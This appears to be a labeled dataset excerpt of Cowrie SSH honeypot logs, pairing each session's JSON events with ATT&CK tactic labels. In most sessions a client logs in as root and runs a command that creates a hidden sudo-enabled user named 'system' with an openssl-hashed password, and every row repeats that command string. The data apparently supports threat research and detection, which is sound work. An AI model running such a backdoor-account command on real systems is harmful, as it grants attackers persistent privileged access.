,event,session_id,session,labels
711,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 FnPmPUHM"", ""message"": ""CMD: openssl passwd -1 FnPmPUHM"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.911079Z"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
712,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 FnPmPUHM"", ""message"": ""Command not found: openssl passwd -1 FnPmPUHM"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.911975Z"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
713,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/55d051b1a46130c348b4fa19823f3891d7313b5cea50438af4408167a51d4c56 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""55d051b1a46130c348b4fa19823f3891d7313b5cea50438af4408167a51d4c56"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.925822Z"", ""ttylog"": ""var/lib/cowrie/tty/55d051b1a46130c348b4fa19823f3891d7313b5cea50438af4408167a51d4c56"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
714,"{""duration"": ""0.3"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.3 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.926746Z"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
715,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:51846 (10.42.6.15:2222) [session: dd07bb956c56]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 51846.0, ""timestamp"": ""2025-08-07T23:16:27.801051Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
716,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:27.805931Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
717,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:27.821868Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
718,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:27.899768Z"", ""username"": ""root"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
719,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.003997Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
720,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.005098Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
721,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 qymahrCW"", ""message"": ""CMD: openssl passwd -1 qymahrCW"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.006289Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
722,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 qymahrCW"", ""message"": ""Command not found: openssl passwd -1 qymahrCW"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.007665Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
723,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/674b46d8cbb34da1d2eaa2dbb19ed51687ebbe8439e7edd9a0dd3e0d4f493ba7 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""674b46d8cbb34da1d2eaa2dbb19ed51687ebbe8439e7edd9a0dd3e0d4f493ba7"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.028960Z"", ""ttylog"": ""var/lib/cowrie/tty/674b46d8cbb34da1d2eaa2dbb19ed51687ebbe8439e7edd9a0dd3e0d4f493ba7"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
724,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T23:16:28.029855Z"", ""session_id"": ""dd07bb956c56""}",dd07bb956c56,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 qymahrCW) system  && sudo usermod -aG sudo system ; openssl passwd -1 qymahrCW;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
725,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:15215 (10.42.4.33:2222) [session: 0df4b57680ad]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 15215.0, ""timestamp"": ""2025-08-07T06:07:55.801839Z"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
726,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:55.802262Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
727,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:55.905658Z"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
728,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:56.217557Z"", ""username"": ""root"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
729,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:56.474930Z"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
730,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:56.475285Z"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
731,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 pDsMUUQt"", ""message"": ""CMD: openssl passwd -1 pDsMUUQt"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:56.475700Z"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
732,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 pDsMUUQt"", ""message"": ""Command not found: openssl passwd -1 pDsMUUQt"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:56.476264Z"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
733,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/cde21e226e048bcb430dbd3d0075e5599b19ec7868c63070ff80a2830a0a80c4 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""cde21e226e048bcb430dbd3d0075e5599b19ec7868c63070ff80a2830a0a80c4"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:56.580916Z"", ""ttylog"": ""var/lib/cowrie/tty/cde21e226e048bcb430dbd3d0075e5599b19ec7868c63070ff80a2830a0a80c4"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
734,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T06:07:56.581747Z"", ""session_id"": ""0df4b57680ad""}",0df4b57680ad,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pDsMUUQt) system  && sudo usermod -aG sudo system ; openssl passwd -1 pDsMUUQt;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
735,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:52042 (10.42.6.15:2222) [session: 4fa89eff524b]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 52042.0, ""timestamp"": ""2025-08-11T12:31:25.147598Z"", ""session_id"": ""4fa89eff524b""}",4fa89eff524b,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kfSWfMGF) system  && sudo usermod -aG sudo system ; openssl passwd -1 kfSWfMGF;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
736,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T12:31:25.148973Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""4fa89eff524b""}",4fa89eff524b,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kfSWfMGF) system  && sudo usermod -aG sudo system ; openssl passwd -1 kfSWfMGF;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
737,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T12:31:25.161616Z"", ""session_id"": ""4fa89eff524b""}",4fa89eff524b,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kfSWfMGF) system  && sudo usermod -aG sudo system ; openssl passwd -1 kfSWfMGF;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
738,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T12:31:25.204726Z"", ""username"": ""root"", ""session_id"": ""4fa89eff524b""}",4fa89eff524b,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kfSWfMGF) system  && sudo usermod -aG sudo system ; openssl passwd -1 kfSWfMGF;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
